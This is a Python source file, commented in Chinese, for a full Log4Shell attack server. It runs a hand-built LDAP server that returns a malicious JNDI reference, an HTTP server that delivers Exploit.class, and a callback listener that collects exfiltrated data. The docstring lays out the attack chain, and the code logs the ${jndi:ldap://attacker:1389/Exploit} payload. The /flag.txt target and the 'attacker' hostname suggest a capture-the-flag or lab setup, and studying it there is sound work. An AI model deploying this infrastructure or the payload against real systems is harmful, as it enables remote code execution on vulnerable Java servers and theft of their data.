"""
Log4Shell 攻擊伺服器
====================
整合 LDAP Server + HTTP Server + Callback Receiver

功能：
1. LDAP Server (port 1389): 回應 JNDI lookup，指向 HTTP Server 上的惡意類別
2. HTTP Server (port 8888): 提供編譯好的 Exploit.class
3. Callback Server (port 9999): 接收攻擊成功後回傳的 flag

攻擊流程：
1. 受害者應用程式記錄含有 ${jndi:ldap://attacker:1389/Exploit} 的字串
2. Log4j 解析 JNDI lookup，連接到本 LDAP Server
3. LDAP Server 回傳 Reference，指向 http://attacker:8888/Exploit.class
4. 受害者 JVM 下載並執行 Exploit.class
5. Exploit.class 執行 cat /flag.txt，將結果 POST 到 http://attacker:9999/callback
"""

import os
import sys
import socket
import struct
import threading
import logging
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from socketserver import ThreadingMixIn

# 設定日誌
LOG_FILE = "/var/log/attacker.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


def log_to_file(message):
    """寫入日誌檔案"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)
    print(log_entry.strip())


# =====================================================
# HTTP Server - 提供 Exploit.class
# =====================================================
class ExploitHTTPHandler(SimpleHTTPRequestHandler):
    """HTTP Handler 提供惡意 class 檔案"""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory="/app", **kwargs)
    
    def do_GET(self):
        log_to_file(f"[HTTP] GET request from {self.client_address[0]}: {self.path}")
        
        if self.path == "/Exploit.class" or self.path == "/Exploit":
            try:
                with open("/app/Exploit.class", "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "application/java")
                self.send_header("Content-Length", len(content))
                self.end_headers()
                self.wfile.write(content)
                log_to_file(f"[HTTP] Served Exploit.class ({len(content)} bytes)")
            except FileNotFoundError:
                self.send_error(404, "Exploit.class not found")
                log_to_file("[HTTP] ERROR: Exploit.class not found")
        else:
            super().do_GET()
    
    def log_message(self, format, *args):
        pass  # 靜默預設日誌


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """多執行緒 HTTP Server"""
    daemon_threads = True


# =====================================================
# Callback Server - 接收 flag
# =====================================================
class CallbackHTTPHandler(SimpleHTTPRequestHandler):
    """接收攻擊成功後的 callback"""
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        
        log_to_file("=" * 50)
        log_to_file("[CALLBACK] 🎉 FLAG RECEIVED!")
        log_to_file(f"[CALLBACK] From: {self.client_address[0]}")
        log_to_file(f"[CALLBACK] Path: {self.path}")
        log_to_file(f"[CALLBACK] Body: {body}")
        log_to_file("=" * 50)
        
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Flag received!")
    
    def do_GET(self):
        log_to_file(f"[CALLBACK] GET request from {self.client_address[0]}: {self.path}")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Callback server is running")
    
    def log_message(self, format, *args):
        pass


class ThreadedCallbackServer(ThreadingMixIn, HTTPServer):
    """多執行緒 Callback Server"""
    daemon_threads = True


# =====================================================
# LDAP Server - 使用正確的 JNDI Reference 格式
# =====================================================
class LDAPServer:
    """
    LDAP Server 實作
    回應包含 javaFactory 和 javaCodeBase 的 JNDI Reference
    """
    
    def __init__(self, host="0.0.0.0", port=1389, http_host="attacker", http_port=8888):
        self.host = host
        self.port = port
        self.http_host = http_host
        self.http_port = http_port
        self.codebase = f"http://{http_host}:{http_port}/"
    
    def _ber_length(self, length):
        """編碼 BER 長度"""
        if length < 128:
            return bytes([length])
        elif length < 256:
            return bytes([0x81, length])
        else:
            return bytes([0x82, (length >> 8) & 0xff, length & 0xff])
    
    def _ber_sequence(self, data):
        """建立 BER SEQUENCE"""
        return bytes([0x30]) + self._ber_length(len(data)) + data
    
    def _ber_octet_string(self, data):
        """建立 BER OCTET STRING"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        return bytes([0x04]) + self._ber_length(len(data)) + data
    
    def _ber_integer(self, value):
        """建立 BER INTEGER"""
        if value < 128:
            return bytes([0x02, 1, value])
        elif value < 256:
            return bytes([0x02, 2, 0, value])
        else:
            return bytes([0x02, 2, (value >> 8) & 0xff, value & 0xff])
    
    def _ber_set(self, data):
        """建立 BER SET"""
        return bytes([0x31]) + self._ber_length(len(data)) + data
    
    def _ber_enumerated(self, value):
        """建立 BER ENUMERATED"""
        return bytes([0x0a, 1, value])
    
    def _make_attribute(self, attr_type, *values):
        """建立 LDAP 屬性"""
        attr_type_encoded = self._ber_octet_string(attr_type)
        values_encoded = b"".join(self._ber_octet_string(v) for v in values)
        values_set = self._ber_set(values_encoded)
        return self._ber_sequence(attr_type_encoded + values_set)
    
    def create_search_result_entry(self, message_id):
        """建立 SearchResultEntry 回應"""
        
        # DN
        dn = "cn=Exploit,dc=example,dc=com"
        dn_encoded = self._ber_octet_string(dn)
        
        # Attributes for JNDI Reference
        attrs = (
            self._make_attribute("javaClassName", "Exploit") +
            self._make_attribute("javaCodeBase", self.codebase) +
            self._make_attribute("objectClass", "javaNamingReference") +
            self._make_attribute("javaFactory", "Exploit")
        )
        attrs_sequence = self._ber_sequence(attrs)
        
        # SearchResultEntry [APPLICATION 4]
        entry_content = dn_encoded + attrs_sequence
        search_result_entry = bytes([0x64]) + self._ber_length(len(entry_content)) + entry_content
        
        # LDAPMessage
        msg_id = self._ber_integer(message_id)
        ldap_message_content = msg_id + search_result_entry
        
        return self._ber_sequence(ldap_message_content)
    
    def create_search_result_done(self, message_id):
        """建立 SearchResultDone 回應"""
        
        # Result: success (0), empty matchedDN, empty diagnosticMessage
        result_code = self._ber_enumerated(0)
        matched_dn = self._ber_octet_string("")
        diagnostic_msg = self._ber_octet_string("")
        
        result_content = result_code + matched_dn + diagnostic_msg
        
        # SearchResultDone [APPLICATION 5]
        search_result_done = bytes([0x65]) + self._ber_length(len(result_content)) + result_content
        
        # LDAPMessage
        msg_id = self._ber_integer(message_id)
        ldap_message_content = msg_id + search_result_done
        
        return self._ber_sequence(ldap_message_content)
    
    def parse_message_id(self, data):
        """解析 LDAP 訊息中的 message ID"""
        try:
            # 跳過 SEQUENCE tag
            pos = 0
            if data[pos] != 0x30:
                return 1
            pos += 1
            
            # 解析長度
            if data[pos] & 0x80:
                len_bytes = data[pos] & 0x7f
                pos += 1 + len_bytes
            else:
                pos += 1
            
            # 讀取 INTEGER (message ID)
            if data[pos] == 0x02:
                pos += 1
                id_len = data[pos]
                pos += 1
                msg_id = int.from_bytes(data[pos:pos + id_len], 'big')
                return msg_id
        except Exception as e:
            log_to_file(f"[LDAP] Error parsing message ID: {e}")
        return 1
    
    def is_search_request(self, data):
        """檢查是否為 SearchRequest"""
        # SearchRequest 的 tag 是 [APPLICATION 3] = 0x63
        return b'\x63' in data
    
    def is_bind_request(self, data):
        """檢查是否為 BindRequest"""
        # BindRequest 的 tag 是 [APPLICATION 0] = 0x60
        return b'\x60' in data
    
    def create_bind_response(self, message_id):
        """建立 BindResponse"""
        # Result: success (0)
        result_code = self._ber_enumerated(0)
        matched_dn = self._ber_octet_string("")
        diagnostic_msg = self._ber_octet_string("")
        
        result_content = result_code + matched_dn + diagnostic_msg
        
        # BindResponse [APPLICATION 1]
        bind_response = bytes([0x61]) + self._ber_length(len(result_content)) + result_content
        
        # LDAPMessage
        msg_id = self._ber_integer(message_id)
        ldap_message_content = msg_id + bind_response
        
        return self._ber_sequence(ldap_message_content)
    
    def handle_client(self, client_socket, client_address):
        """處理單一客戶端連線"""
        log_to_file(f"[LDAP] Connection from {client_address[0]}:{client_address[1]}")
        
        try:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                log_to_file(f"[LDAP] Received {len(data)} bytes from {client_address[0]}")
                
                msg_id = self.parse_message_id(data)
                log_to_file(f"[LDAP] Message ID: {msg_id}")
                
                if self.is_bind_request(data):
                    log_to_file(f"[LDAP] BindRequest received, sending BindResponse")
                    response = self.create_bind_response(msg_id)
                    client_socket.send(response)
                    
                elif self.is_search_request(data):
                    log_to_file(f"[LDAP] SearchRequest received")
                    log_to_file(f"[LDAP] Sending malicious JNDI Reference")
                    log_to_file(f"[LDAP] javaCodeBase: {self.codebase}")
                    log_to_file(f"[LDAP] javaFactory: Exploit")
                    
                    # 發送 SearchResultEntry
                    entry = self.create_search_result_entry(msg_id)
                    client_socket.send(entry)
                    log_to_file(f"[LDAP] Sent SearchResultEntry ({len(entry)} bytes)")
                    
                    # 發送 SearchResultDone
                    done = self.create_search_result_done(msg_id)
                    client_socket.send(done)
                    log_to_file(f"[LDAP] Sent SearchResultDone ({len(done)} bytes)")
                else:
                    log_to_file(f"[LDAP] Unknown request type, raw data: {data[:50].hex()}")
                
        except Exception as e:
            log_to_file(f"[LDAP] Error handling client: {e}")
        finally:
            client_socket.close()
            log_to_file(f"[LDAP] Connection closed from {client_address[0]}")
    
    def start(self):
        """啟動 LDAP Server"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        
        log_to_file(f"[LDAP] Server listening on {self.host}:{self.port}")
        
        while True:
            client_socket, client_address = server_socket.accept()
            client_thread = threading.Thread(
                target=self.handle_client,
                args=(client_socket, client_address)
            )
            client_thread.daemon = True
            client_thread.start()


# =====================================================
# Main
# =====================================================
def main():
    log_to_file("=" * 50)
    log_to_file("🔓 Log4Shell Attack Server Starting...")
    log_to_file("=" * 50)
    
    # 取得環境變數設定
    http_host = os.environ.get("HTTP_HOST", "attacker")
    http_port = int(os.environ.get("HTTP_PORT", "8888"))
    
    # 啟動 HTTP Server (port 8888)
    http_server = ThreadedHTTPServer(("0.0.0.0", 8888), ExploitHTTPHandler)
    http_thread = threading.Thread(target=http_server.serve_forever)
    http_thread.daemon = True
    http_thread.start()
    log_to_file("[HTTP] Server started on port 8888")
    
    # 啟動 Callback Server (port 9999)
    callback_server = ThreadedCallbackServer(("0.0.0.0", 9999), CallbackHTTPHandler)
    callback_thread = threading.Thread(target=callback_server.serve_forever)
    callback_thread.daemon = True
    callback_thread.start()
    log_to_file("[CALLBACK] Server started on port 9999")
    
    # 啟動 LDAP Server (port 1389)
    ldap_server = LDAPServer(
        host="0.0.0.0",
        port=1389,
        http_host=http_host,
        http_port=http_port
    )
    log_to_file("[LDAP] Server starting on port 1389...")
    log_to_file("")
    log_to_file("🎯 Ready to receive attacks!")
    log_to_file(f"   Payload: ${{jndi:ldap://attacker:1389/Exploit}}")
    log_to_file(f"   Codebase: http://{http_host}:{http_port}/")
    log_to_file("")
    
    # LDAP Server 在主執行緒運行
    ldap_server.start()


if __name__ == "__main__":
    main()
